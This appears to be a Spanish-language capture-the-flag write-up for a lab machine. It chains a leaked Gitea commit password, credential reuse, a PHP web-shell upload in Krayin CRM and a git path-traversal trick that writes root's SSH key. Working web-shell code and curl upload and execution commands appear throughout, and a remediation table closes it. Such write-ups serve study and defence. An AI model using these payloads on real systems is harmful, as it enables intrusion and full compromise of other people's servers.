## Fuga de credencial en Gitea

Gitea 1.26.0 expone un repo público, `admin/krayin-docker-setup`. Su `.env` apunta a un tercer vhost (`billing.nexus.htb`, un Krayin CRM) y, aunque la contraseña de BD está borrada en la versión actual, sigue viva en el **historial de commits**.

```bash
curl -s http://git.nexus.htb/api/v1/repos/search | jq
admin/krayin-docker-setup   users: admin, jones

# El .env actual: DB_PASSWORD vacío. Miramos el primer commit
curl -s http://git.nexus.htb/admin/krayin-docker-setup/raw/commit/1615c465/.env
APP_URL=http://billing.nexus.htb
DB_PASSWORD=N27xh!!2ucY04
```

> Borrar un secreto de un archivo y hacer commit NO lo elimina: queda para siempre en el objeto del commit anterior. La API de Gitea permite leer cualquier commit por su hash sin autenticación si el repo es público.
{: .prompt-danger }

> Ante cualquier repo, revisá `/commits` y descargá versiones antiguas de `.env`, `config.php`, `settings.py`. Herramientas: `gitleaks`, `trufflehog`, o simplemente `git log -p`.
{: .prompt-tip }

Esa contraseña, **reutilizada**, abre el panel de Krayin CRM como administrador:

**Credenciales:** `j.matthew@nexus.htb : N27xh!!2ucY04`

> **Krayin CRM 2.2.0** sobre Laravel 12, con `APP_DEBUG=true`, lo que expone phpDebugBar y páginas de error de Ignition con rutas internas (`/var/www/krayin`).

## RCE en Krayin — CVE-2026-38526

Krayin CRM 2.2.x no valida el tipo de archivo en el endpoint de subida de medios de TinyMCE. Un usuario autenticado puede subir un `.php` que queda accesible y ejecutable en `/storage/tinymce/`.

```bash
# 1) shell mínima + token CSRF de un formulario del admin
echo '<?php system($_REQUEST["c"]); ?>' > sh.php

# 2) subida al endpoint vulnerable
curl -b cookies.txt -H "X-CSRF-TOKEN: $TOK" \
    -F "_token=$TOK" -F "file=@sh.php;filename=sh.php" \
    http://billing.nexus.htb/admin/tinymce/upload
{"location":"http://billing.nexus.htb/storage/tinymce/6e59...cba8.php"}

# 3) ejecución
curl http://billing.nexus.htb/storage/tinymce/6e59...php --data "c=id"
uid=33(www-data) gid=33(www-data)   host: nexus
```

> El patrón clásico "file upload → RCE" necesita dos condiciones: (1) el servidor guarda el nombre/extensión que enviamos y (2) el directorio de destino es servido por PHP-FPM. Aquí se cumplen ambas: `/storage/tinymce/` es un enlace público y nginx pasa los `.php` a FPM.
{: .prompt-danger }

> Tras autenticarte en cualquier CRM/CMS, identificá versión exacta y buscá `<producto> <versión> authenticated RCE` en Exploit-DB. Un editor WYSIWYG (TinyMCE, CKEditor) casi siempre tiene un endpoint de subida.
{: .prompt-tip }

> La única barrera real fue el **token CSRF**: Laravel devolvía `419 CSRF token mismatch` hasta extraer el `_token` de un formulario del panel y enviarlo como cabecera y campo.
{: .prompt-warning }

## Escalada a root · Path traversal en git

Un timer de systemd ejecuta como **root** cada minuto el script `/etc/gitea/template-sync.py`. El script copia los archivos de cualquier repo Gitea marcado como *template* usando `os.path.join(stage, filepath)` **sin sanear** la ruta: un archivo cuya ruta contenga `../` permite escritura arbitraria como root.

```
jones (usuario Gitea, contraseña reutilizada)
  └─▶ crea repo "template" con ruta maliciosa
        └─▶ template-sync.py (root, cada 60s, os.path.join sin validar)
              └─▶ escribe ../../../../../root/.ssh/authorized_keys
                    └─▶ root (SSH con clave inyectada)
```

```python
# fragmento vulnerable — filepath viene de `git ls-tree` del repo
target = os.path.join(stage_path, filepath)   # ← sin realpath/prefijo
os.makedirs(os.path.dirname(target), exist_ok=True)
open(target, 'wb').write(cat_result.stdout)
```

> `os.path.join(a, b)` con `b` lleno de `../` escapa del directorio base. El truco: meter componentes `..` dentro de un árbol de git. El cliente los rechaza por fsck, pero `git hash-object --literally` escribe objetos "malformados" sin validar, y Gitea (con fsck de recepción desactivado) los acepta en el push.
{: .prompt-danger }

> Cualquier script que corra como root y toque rutas controladas por el atacante (nombres de archivo, de repo, de subida) es candidato a path traversal. La defensa correcta es `os.path.realpath` + comprobar que el resultado empieza por el directorio permitido.
{: .prompt-tip }

**Construcción del repo template con la ruta maliciosa** (ejecutado como `jones`, Gitea accesible en `localhost:3000`):

1. Crear el **blob** con la clave pública: `git hash-object -w ak.txt`.
2. Ensamblar árboles anidados con `git hash-object -t tree --stdin --literally`, cada nivel una entrada `..`, formando `../../../../../root/.ssh/authorized_keys`.
3. `git commit-tree` + `git update-ref refs/heads/main` para el commit raíz.
4. Crear el repo vía API (`POST /api/v1/user/repos`) y `git push -f`.
5. Marcarlo como plantilla: `PATCH /api/v1/repos/jones/<repo> {"template":true}`.
6. Esperar < 60 s: root escribe la clave en `/root/.ssh/authorized_keys`.

> El propio git avisa `unable to access '../../../../../root/.ssh/...'` al empaquetar — confirmación de que la ruta con traversal viajó en el árbol.
{: .prompt-info }

```bash
ssh -i root_key root@10.129.59.78 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
```

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| Secreto en historial de git (`DB_PASSWORD` en un commit antiguo) | Crítica | Rotar credenciales expuestas; reescribir historial (BFG/filter-repo); escanear con gitleaks en CI |
| Reutilización de contraseñas (misma clave en repo, BD y SSH) | Crítica | Credenciales únicas por servicio; gestor de secretos; MFA en SSH |
| CVE-2026-38526 · Krayin CRM (subida PHP sin validar en TinyMCE) | Crítica | Actualizar Krayin; validar MIME/extensión; servir uploads desde ruta no ejecutable |
| `APP_DEBUG` en producción (phpDebugBar + Ignition) | Media | `APP_DEBUG=false`; retirar debugbar; ocultar rutas internas |
| Path traversal en `template-sync.py` (escritura arbitraria como root) | Crítica | Validar `realpath` dentro del directorio de staging; ejecutar el servicio sin privilegios; activar fsck de recepción en Gitea |

**Herramientas:** `nmap` · `ffuf` · `curl` · `Gitea API` · `git (plumbing)` · `sshpass` · `mysql`
